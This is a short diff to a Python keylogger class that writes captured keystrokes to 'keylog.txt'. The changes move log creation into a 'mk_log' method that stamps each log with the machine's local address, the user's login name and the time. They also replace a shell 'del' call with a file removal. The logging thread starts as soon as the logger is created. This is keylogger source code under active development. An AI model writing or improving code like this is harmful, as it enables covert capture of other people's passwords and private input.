@@ -15,6 +15,7 @@ class Logger:
     hook = None
     paused = False
     path = ''
+    log = None
 
     def __init__(self, path, name='keylog.txt'):
 
@@ -22,16 +23,19 @@ class Logger:
         self.path = path + name
 
         # Creates the log file if it doesn't exist
-        header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
-        divider = "______________________________________________________\n\n"
         if not os.path.isfile(self.path):
-            self.log = open(self.path, 'w')
-            general.append_to_file(self.path, header + divider)
+            self.mk_log()
 
         # Sets up the thread and starts logging keys on it
         t = threading.Thread(target=self.start)
         t.daemon = False
         t.start()
+
+    def mk_log(self):
+        self.log = open(self.path, 'w')
+        header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
+        divider = "______________________________________________________\n\n"
+        general.append_to_file(self.path, header + divider)
 
     def start(self):
 
@@ -52,7 +56,8 @@ class Logger:
         self.buffer = ''
 
     def del_log(self):
-    	os.system('del ' + '"' + self.path + '"')
+        os.remove(self.path)
+        self.mk_log()
 
     def on_keyboard_event(self, event):
 
